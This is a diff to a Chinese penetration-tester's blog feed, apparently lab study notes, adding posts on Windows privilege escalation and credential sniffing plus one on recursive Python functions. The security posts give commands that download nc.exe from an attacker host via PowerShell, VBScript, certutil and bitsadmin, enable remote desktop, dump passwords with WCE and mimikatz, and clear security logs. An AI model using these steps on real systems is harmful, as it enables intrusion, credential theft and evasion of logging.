@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-05-18T10:25:19.634Z</updated>
+  <updated>2019-05-23T11:42:14.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,11 +17,315 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>windows提权</title>
+    <link href="http://yoursite.com/2019/05/23/windows-ti-quan/"/>
+    <id>http://yoursite.com/2019/05/23/windows-ti-quan/</id>
+    <published>2019-05-22T19:29:07.000Z</published>
+    <updated>2019-05-23T11:42:14.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;1-漏洞收集-0day库&quot;&gt;&lt;a href=&quot;#1-漏洞收集-0day库&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞收集 0day库&quot;&gt;&lt;/a&gt;1. 漏洞收集 0day库&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;exploit-db &lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://0day.today&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;0da’y&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://securitytracker.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://securitytracker.com/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/modules/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.rapid7.com/db/modules/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://cxsecurity.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://cxsecurity.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;2-cve-2018-8120、cve-2018-8897、cve-2018-8174&quot;&gt;&lt;a href=&quot;#2-cve-2018-8120、cve-2018-8897、cve-2018-8174&quot; class=&quot;headerlink&quot; title=&quot;2.  cve-2018-8120、cve-2018-8897、cve-2018-8174&quot;&gt;&lt;/a&gt;2.  cve-2018-8120、cve-2018-8897、cve-2018-8174&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;使用exploit进行提权&lt;/li&gt;
+&lt;li&gt;使用mimikatz抓管理员密码&lt;/li&gt;
+&lt;li&gt;使用命令行开启远程桌面&lt;/li&gt;
+&lt;li&gt;使用账号密码连接&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&quot;3-停止安全软件相关服务&quot;&gt;&lt;a href=&quot;#3-停止安全软件相关服务&quot; class=&quot;headerlink&quot; title=&quot;3. 停止安全软件相关服务&quot;&gt;&lt;/a&gt;3. 停止安全软件相关服务&lt;/h3&gt;&lt;h3 id=&quot;4-文件传输三十六计&quot;&gt;&lt;a href=&quot;#4-文件传输三十六计&quot; class=&quot;headerlink&quot; title=&quot;4. 文件传输三十六计&quot;&gt;&lt;/a&gt;4. 文件传输三十六计&lt;/h3&gt;&lt;h4 id=&quot;4-1-windows文件传输&quot;&gt;&lt;a href=&quot;#4-1-windows文件传输&quot; class=&quot;headerlink&quot; title=&quot;4.1 windows文件传输&quot;&gt;&lt;/a&gt;4.1 windows文件传输&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;使用powershell下载&lt;ul&gt;
+&lt;li&gt;首先在kali 的 /var/www/html放入你的exe文件比如说nc.exe&lt;/li&gt;
+&lt;li&gt;powershell输入如下命令&lt;br&gt;&lt;code&gt;`&lt;/code&gt;&lt;br&gt;$p=New-Object system.net.webclient.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;$p.downloadfile(“&lt;a href=&quot;http://192.168.178.200/nc.exe&amp;quot;,&amp;quot;nc.exe&amp;quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.178.200/nc.exe&amp;quot;,&amp;quot;nc.exe&amp;quot;&lt;/a&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+-  也可以将上述命令存储在ps1文件中执行，但是默认情况下是无法执行powershell脚本的，需要在管理员权限下修改配置
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;powershell set-executionpolicy unrestricted&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+
+2.  Visual Basic 文件下载
+
+``` vbscript
+Set args = Wscript.Arguments
+Url = &amp;quot;http://192.168.178.200/nc.exe&amp;quot;
+dim xHttp: Set xHttp = createobject(&amp;quot;Microsoft.XMLHTTP&amp;quot;)
+dim bStrm: Set bStrm = createobject(&amp;quot;Adodb.Stream&amp;quot;)
+xHttp.Open &amp;quot;GET&amp;quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 &amp;#39;
+    .open
+    .write xHttp.responseBody
+    .savetofile &amp;quot; C:\nc.exe&amp;quot;, 2 &amp;#39;
+end with
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;cmd下执行  &lt;code&gt;cscript test.vbs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g3bc96rnfaj318o0menow.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;由于是users组用户所以不能直接放在c盘权限不够&lt;/p&gt;
+&lt;ol start=&quot;3&quot;&gt;
+&lt;li&gt;nc传输&lt;br&gt;发送方cmd下执行:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;nc.exe -L -p 8888 &amp;lt;test.vbs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接收方执行&lt;br&gt;&lt;code&gt;nc.exe 192.168.1.105 8888 &amp;gt;test.vbs&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&quot;4&quot;&gt;
+&lt;li&gt;&lt;p&gt;使用certutil&lt;br&gt;&lt;code&gt;certutil -urlcache -split -f http://192.168.178.200/nc.exe nc.exe&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;使用bitsadmin&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;bitsadmin /transfer n http://domain/file c:\%homepath%\file&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&quot;6&quot;&gt;
+&lt;li&gt;ftp&lt;/li&gt;
+&lt;li&gt;Windows Share File Download&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;tftp&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;ipc文件下载/上传/登陆&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>递归函数</title>
+    <link href="http://yoursite.com/2019/05/22/di-gui-han-shu/"/>
+    <id>http://yoursite.com/2019/05/22/di-gui-han-shu/</id>
+    <published>2019-05-21T19:11:00.000Z</published>
+    <updated>2019-05-23T11:42:24.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;1-使用递归函数实现sum&quot;&gt;&lt;a href=&quot;#1-使用递归函数实现sum&quot; class=&quot;headerlink&quot; title=&quot;1. 使用递归函数实现sum&quot;&gt;&lt;/a&gt;1. 使用递归函数实现sum&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def mysum(mylist):
+    if len(mylist)==0:
+        return 0
+    else:
+        return mylist.pop()+mysum(mylist)
+
+mylist=[1,2,2,3,4]
+print(mysum(mylist))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;2-编写一个递归函数来计算列表中包含的元素数&quot;&gt;&lt;a href=&quot;#2-编写一个递归函数来计算列表中包含的元素数&quot; class=&quot;headerlink&quot; title=&quot;2. 编写一个递归函数来计算列表中包含的元素数&quot;&gt;&lt;/a&gt;2. 编写一个递归函数来计算列表中包含的元素数&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def mysum(mylist):
+    if len(mylist)==0:
+        return 0
+    else:
+        mylist.pop()
+        return 1+mysum(mylist)
+
+mylist=[1,2,2,3,4]
+print(mysum(mylist))
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;3-找出列表中的最大数字&quot;&gt;&lt;a href=&quot;#3-找出列表中的最大数字&quot; class=&quot;headerlink&quot; title=&quot;3.找出列表中的最大数字&quot;&gt;&lt;/a&gt;3.找出列表中的最大数字&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt; def max(list):
+    if len(list)==2:
+        return list[0] if list[0]&amp;gt;list[1] else list[1]
+    sub_max=max(list[1:])
+    return list[0] if list[0]&amp;gt;sub_max else sub_max 
+
+print(max([1,3,0,7,8]))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;通常编写涉及数组的递归函数时，基线条件就是数组为空或者只包含一个元素，陷入困境时，请检查基线条件是不是这样的。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;4-使用递归实现快排&quot;&gt;&lt;a href=&quot;#4-使用递归实现快排&quot; class=&quot;headerlink&quot; title=&quot;4. 使用递归实现快排&quot;&gt;&lt;/a&gt;4. 使用递归实现快排&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def sort_by_q(mylist):
+    if len(mylist)&amp;lt;2:
+        return mylist
+    else:
+        select=mylist[0]
+        left=[i for i in mylist[1:] if i&amp;lt;=select]
+        right=[i for i in mylist[1:] if i&amp;gt;select]
+        return sort_by_q(left)+[select]+sort_by_q(right)
+print(sort_by_q([1,2,3,9,0,1,22,33]))
+
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+      <category term="算法 -" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用漏洞进行提权</title>
+    <link href="http://yoursite.com/2019/05/21/shi-yong-lou-dong-jin-xing-ti-quan/"/>
+    <id>http://yoursite.com/2019/05/21/shi-yong-lou-dong-jin-xing-ti-quan/</id>
+    <published>2019-05-21T02:05:42.000Z</published>
+    <updated>2019-05-23T11:42:44.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;1-信息收集&quot;&gt;&lt;a href=&quot;#1-信息收集&quot; class=&quot;headerlink&quot; title=&quot;1. 信息收集&quot;&gt;&lt;/a&gt;1. 信息收集&lt;/h3&gt;&lt;p&gt;提权的条件: 1. 拥有普通用户的权限&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;                2. 拥有网站的webshell
+                3. 存在提权的漏洞
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;1-1-操作系统的信息收集&quot;&gt;&lt;a href=&quot;#1-1-操作系统的信息收集&quot; class=&quot;headerlink&quot; title=&quot;1.1 操作系统的信息收集&quot;&gt;&lt;/a&gt;1.1 操作系统的信息收集&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g39b2q4stkj30ki0el0y8.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;h4 id=&quot;1-2-远程桌面查看命令&quot;&gt;&lt;a href=&quot;#1-2-远程桌面查看命令&quot; class=&quot;headerlink&quot; title=&quot;1.2  远程桌面查看命令&quot;&gt;&lt;/a&gt;1.2  远程桌面查看命令&lt;/h4&gt;&lt;h5 id=&quot;1-2-1-查看是否开启远程桌面&quot;&gt;&lt;a href=&quot;#1-2-1-查看是否开启远程桌面&quot; class=&quot;headerlink&quot; title=&quot;1.2.1 查看是否开启远程桌面&quot;&gt;&lt;/a&gt;1.2.1 查看是否开启远程桌面&lt;/h5&gt;&lt;p&gt;&lt;code&gt;REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections&lt;/code&gt;如果显示0x01就是关闭。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g39bgy2fbjj30uo03hdfx.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;h5 id=&quot;1-2-2-开启远程3389&quot;&gt;&lt;a href=&quot;#1-2-2-开启远程3389&quot; class=&quot;headerlink&quot; title=&quot;1.2.2 开启远程3389&quot;&gt;&lt;/a&gt;1.2.2 开启远程3389&lt;/h5&gt;&lt;p&gt;&lt;code&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&lt;/code&gt;这个需要管理员Administrator才能开启&lt;/p&gt;
+&lt;h5 id=&quot;1-2-3-查看远程桌面开启的端口&quot;&gt;&lt;a href=&quot;#1-2-3-查看远程桌面开启的端口&quot; class=&quot;headerlink&quot; title=&quot;1.2.3 查看远程桌面开启的端口&quot;&gt;&lt;/a&gt;1.2.3 查看远程桌面开启的端口&lt;/h5&gt;&lt;p&gt;&lt;code&gt;REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server\WinStations\RDP-Tcp /v PortNumber&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;1-2-4-查看计算机上的敏感文件&quot;&gt;&lt;a href=&quot;#1-2-4-查看计算机上的敏感文件&quot; class=&quot;headerlink&quot; title=&quot;1.2.4 查看计算机上的敏感文件&quot;&gt;&lt;/a&gt;1.2.4 查看计算机上的敏感文件&lt;/h4&gt;&lt;p&gt; &lt;code&gt;dir /b /s *.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&quot;1-3-内网信息收集的脚本&quot;&gt;&lt;a href=&quot;#1-3-内网信息收集的脚本&quot; class=&quot;headerlink&quot; title=&quot;1.3  内网信息收集的脚本&quot;&gt;&lt;/a&gt;1.3  内网信息收集的脚本&lt;/h4&gt;&lt;h4 id=&quot;1-4-使用py脚本直接查找系统存在的漏洞&quot;&gt;&lt;a href=&quot;#1-4-使用py脚本直接查找系统存在的漏洞&quot; class=&quot;headerlink&quot; title=&quot;1.4 使用py脚本直接查找系统存在的漏洞&quot;&gt;&lt;/a&gt;1.4 使用py脚本直接查找系统存在的漏洞&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/GDSSecurity/Windows-Exploit-Suggester&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;windows脚本&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;linux提取使用脚本&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g39ccov7dkj30ea09574r.jpg&quot; alt&gt;&lt;/li&gt;
+&lt;li&gt;在机器上使用 ·systeminfo &amp;gt;win10.txt`&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;windows***.py --database **.xls --systeminfo win10.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;找到相应的poc进行利用&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+      <category term="提权 -" scheme="http://yoursite.com/categories/%E6%8F%90%E6%9D%83/"/>
+    
+    
+      <category term="内网渗透 -" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透-密码嗅探续集</title>
+    <link href="http://yoursite.com/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/"/>
+    <id>http://yoursite.com/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/</id>
+    <published>2019-05-18T21:06:51.000Z</published>
+    <updated>2019-05-23T11:41:56.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-windows身份认证过程&quot;&gt;&lt;a href=&quot;#0x01-windows身份认证过程&quot; class=&quot;headerlink&quot; title=&quot;0x01 windows身份认证过程&quot;&gt;&lt;/a&gt;0x01 windows身份认证过程&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/005BYqpggy1g36qxqslnnj30oc0hn7bl.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;windows NT logon模块， winlogon.exe —-&amp;gt;LSA auth api(lsasrv.dll)—》msv1.0.dll&lt;/p&gt;
+&lt;p&gt;详细的流程：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/005BYqpggy1g36r1b9db7j30oc0hn7bl.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+&lt;p&gt; 注意点: 如果是本地登陆是在本地的组件之间ntlsm安全包接收进行处理，如果是域网络中,那么会跑到域控制器进行验证，会用kerbos协议进行响应。如果是远程登陆那么组件也不一样&lt;/p&gt;
+&lt;p&gt; 目标服务器的一个工具包会维护一个内存里面的明文密码。&lt;/p&gt;
+&lt;h3 id=&quot;0x02-从内存读取windows登陆密码-WCE&quot;&gt;&lt;a href=&quot;#0x02-从内存读取windows登陆密码-WCE&quot; class=&quot;headerlink&quot; title=&quot;0x02 从内存读取windows登陆密码(WCE)&quot;&gt;&lt;/a&gt;0x02 从内存读取windows登陆密码(WCE)&lt;/h3&gt;&lt;p&gt; &lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g3bdz71ieoj30vo0gokeq.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;具有管理员权限&lt;/li&gt;
+&lt;li&gt;/usr/share/wce  kali里面，复制到win7，&lt;/li&gt;
+&lt;li&gt;输入wce  -lv&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/005BYqpggy1g36s8hp602j30r20a6dhk.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+&lt;ol start=&quot;4&quot;&gt;
+&lt;li&gt;wce -w 直接会显示内存里面的密码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/005BYqpggy1g36sm9quxvj30tj0eggno.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+&lt;ol start=&quot;5&quot;&gt;
+&lt;li&gt;wce -i sid -s 用户名:hash  直接修改对应sid的密码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在win8之后，增加安全机制 ，wce需要绕过。&lt;/p&gt;
+&lt;p&gt;扩展：如何防止wce读取密码&lt;br&gt;HKEY-LOCAL-MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\SecurityPackages&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;kerberos&lt;/li&gt;
+&lt;li&gt;msv1_0&lt;/li&gt;
+&lt;li&gt;schannel&lt;/li&gt;
+&lt;li&gt;wdigest  存储在内存&lt;/li&gt;
+&lt;li&gt;tspkg 远程&lt;/li&gt;
+&lt;li&gt;pku2u&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;删除wdigest值&lt;/p&gt;
+&lt;h3 id=&quot;fgdump&quot;&gt;&lt;a href=&quot;#fgdump&quot; class=&quot;headerlink&quot; title=&quot;fgdump&quot;&gt;&lt;/a&gt;fgdump&lt;/h3&gt;&lt;h3 id=&quot;Gethash&quot;&gt;&lt;a href=&quot;#Gethash&quot; class=&quot;headerlink&quot; title=&quot;Gethash&quot;&gt;&lt;/a&gt;Gethash&lt;/h3&gt;&lt;h3 id=&quot;gsecdump&quot;&gt;&lt;a href=&quot;#gsecdump&quot; class=&quot;headerlink&quot; title=&quot;gsecdump&quot;&gt;&lt;/a&gt;gsecdump&lt;/h3&gt;&lt;h3 id=&quot;SamInside&quot;&gt;&lt;a href=&quot;#SamInside&quot; class=&quot;headerlink&quot; title=&quot;SamInside&quot;&gt;&lt;/a&gt;SamInside&lt;/h3&gt;&lt;h3 id=&quot;mimikatz更加强大&quot;&gt;&lt;a href=&quot;#mimikatz更加强大&quot; class=&quot;headerlink&quot; title=&quot;mimikatz更加强大&quot;&gt;&lt;/a&gt;mimikatz更加强大&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g3bdo5xxvyj30ta0el4qp.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;h4 id=&quot;1-使用mimikatz获取hash和明文密码&quot;&gt;&lt;a href=&quot;#1-使用mimikatz获取hash和明文密码&quot; class=&quot;headerlink&quot; title=&quot;1. 使用mimikatz获取hash和明文密码:&quot;&gt;&lt;/a&gt;1. 使用mimikatz获取hash和明文密码:&lt;/h4&gt;&lt;p&gt;输入&lt;code&gt;::&lt;/code&gt;就会进行命令提示，类似help，然后使用&lt;code&gt;privilige::&lt;/code&gt;可以查看debug下面的命令，然后通过&lt;code&gt;privilige::debug&lt;/code&gt;进行一个提权，&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g399wfd3wsj30vg0k8q8b.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;接下来使用&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g399xdxbwlj30st0ffq6u.jpg&quot; alt&gt;,这个模块主要是读取hash的，其中前面的可以用logonPasswords代替，&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g39a025c2tj30xi0iyq8o.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;p&gt;这个可以读取存储在sam里面的hash同时也可以直接从内存中读取明文密码。&lt;/p&gt;
+&lt;h4 id=&quot;2-使得xp可以多用户同时存在&quot;&gt;&lt;a href=&quot;#2-使得xp可以多用户同时存在&quot; class=&quot;headerlink&quot; title=&quot;2.  使得xp可以多用户同时存在&quot;&gt;&lt;/a&gt;2.  使得xp可以多用户同时存在&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g39a2jcm27j30jy0963za.jpg&quot; alt&gt;，使用&lt;strong&gt;ts::multirdp&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&quot;3-使用event-drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录&quot;&gt;&lt;a href=&quot;#3-使用event-drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录&quot; class=&quot;headerlink&quot; title=&quot;3. 使用event::drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录&quot;&gt;&lt;/a&gt;3. 使用event::drop可以丢弃安全日志，之后再操作系统进行的操作都不会被记录&lt;/h4&gt;&lt;p&gt;&lt;code&gt;event::clear&lt;/code&gt;就会清除日志信息&lt;/p&gt;
+&lt;h4 id=&quot;4-token-whoami获得当前用户的信息以及权限&quot;&gt;&lt;a href=&quot;#4-token-whoami获得当前用户的信息以及权限&quot; class=&quot;headerlink&quot; title=&quot;4.  token::whoami获得当前用户的信息以及权限&quot;&gt;&lt;/a&gt;4.  token::whoami获得当前用户的信息以及权限&lt;/h4&gt;&lt;h4 id=&quot;5-misc杂项&quot;&gt;&lt;a href=&quot;#5-misc杂项&quot; class=&quot;headerlink&quot; title=&quot;5. misc杂项&quot;&gt;&lt;/a&gt;5. misc杂项&lt;/h4&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>本地提权(嗅探)</title>
+    <link href="http://yoursite.com/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/"/>
+    <id>http://yoursite.com/2019/05/19/nei-wang-ti-quan-mi-ma-xiu-tan/</id>
+    <published>2019-05-18T20:34:11.000Z</published>
+    <updated>2019-05-23T11:41:42.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-windows下的嗅探工具&quot;&gt;&lt;a href=&quot;#0x01-windows下的嗅探工具&quot; class=&quot;headerlink&quot; title=&quot;0x01 windows下的嗅探工具&quot;&gt;&lt;/a&gt;0x01 windows下的嗅探工具&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;sniffpass&lt;/li&gt;
+&lt;li&gt;cain&lt;/li&gt;
+&lt;li&gt;wireshark&lt;/li&gt;
+&lt;li&gt;Omnipeek&lt;/li&gt;
+&lt;li&gt;commview&lt;/li&gt;
+&lt;li&gt;sniffpass&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&quot;0x02-linux下的嗅探工具&quot;&gt;&lt;a href=&quot;#0x02-linux下的嗅探工具&quot; class=&quot;headerlink&quot; title=&quot;0x02 linux下的嗅探工具&quot;&gt;&lt;/a&gt;0x02 linux下的嗅探工具&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Tcpdump&lt;/li&gt;
+&lt;li&gt;wireshark&lt;/li&gt;
+&lt;li&gt;Dsniff&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;0x03-键盘记录器窃取密码&quot;&gt;&lt;a href=&quot;#0x03-键盘记录器窃取密码&quot; class=&quot;headerlink&quot; title=&quot;0x03 键盘记录器窃取密码&quot;&gt;&lt;/a&gt;0x03 键盘记录器窃取密码&lt;/h3&gt;&lt;h3 id=&quot;0x04-本地缓存的密码&quot;&gt;&lt;a href=&quot;#0x04-本地缓存的密码&quot; class=&quot;headerlink&quot; title=&quot;0x04 本地缓存的密码&quot;&gt;&lt;/a&gt;0x04 本地缓存的密码&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;浏览器缓存的密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;网络密码&lt;br&gt;控制面板—-》用户账户和家庭安全—-》凭据管理器—–》web凭据&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;无线密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.nirsoft.net(集成的密码查找工具)&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.nirsoft.net(集成的密码查找工具)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;无线密码，浏览器缓存的工具(图形化的工具)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dump SAM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;pwdump 可以远程执行&lt;br&gt;/usr/share/windows-binaries/fgdump&lt;/p&gt;
+&lt;p&gt;windows下的登陆密码在C://windows//system32/config/sam&lt;/p&gt;
+&lt;p&gt;所有windows里面的admin账户的sid默认是500&lt;/p&gt;
+&lt;p&gt;前面的密码lmhash计算后面是NTlmhash计算的，复制下来，保存为pwdump后缀文件，使用kali里面的工具进行破解。&lt;/p&gt;
+&lt;h3 id=&quot;0x05-破解&quot;&gt;&lt;a href=&quot;#0x05-破解&quot; class=&quot;headerlink&quot; title=&quot;0x05 破解&quot;&gt;&lt;/a&gt;0x05 破解&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;ophcrack&lt;/li&gt;
+&lt;li&gt;john the ripper&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006d1Stply1g3bg5z5kt9j31480hfe81.jpg&quot; alt&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x06-psexec&quot;&gt;&lt;a href=&quot;#0x06-psexec&quot; class=&quot;headerlink&quot; title=&quot;0x06 psexec&quot;&gt;&lt;/a&gt;0x06 psexec&lt;/h3&gt;&lt;h3 id=&quot;0x07-pr-exe&quot;&gt;&lt;a href=&quot;#0x07-pr-exe&quot; class=&quot;headerlink&quot; title=&quot;0x07 pr.exe&quot;&gt;&lt;/a&gt;0x07 pr.exe&lt;/h3&gt;&lt;h3 id=&quot;0x08-BeRoot&quot;&gt;&lt;a href=&quot;#0x08-BeRoot&quot; class=&quot;headerlink&quot; title=&quot;0x08 BeRoot&quot;&gt;&lt;/a&gt;0x08 BeRoot&lt;/h3&gt;
+    
+    </summary>
+    
+    
+      <category term="内网渗透 -" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>本地提权(一)</title>
+    <link href="http://yoursite.com/2019/05/17/nei-wang-ti-quan-yi/"/>
+    <id>http://yoursite.com/2019/05/17/nei-wang-ti-quan-yi/</id>
+    <published>2019-05-17T01:52:15.000Z</published>
+    <updated>2019-05-23T11:40:06.000Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;h3 id=&quot;0x01-本地提权&quot;&gt;&lt;a href=&quot;#0x01-本地提权&quot; class=&quot;headerlink&quot; title=&quot;0x01  本地提权&quot;&gt;&lt;/a&gt;0x01  本地提权&lt;/h3&gt;&lt;p&gt;条件：已经实现了本地低权限账号的登陆&lt;br&gt;        1.1
+        
+      
+    
+    </summary>
+    
+    
+      <category term="内网提权 -" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
     <title>本地提权(一)</title>
     <link href="http://yoursite.com/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/"/>
     <id>http://yoursite.com/2019/05/17/ben-di-ti-quan-ji-chu-zhi-shi/</id>
     <published>2019-05-17T01:52:15.000Z</published>
-    <updated>2019-05-18T10:25:19.634Z</updated>
+    <updated>2019-05-23T11:39:36.000Z</updated>
     
     <summary type="html">
     
@@ -45,7 +349,7 @@
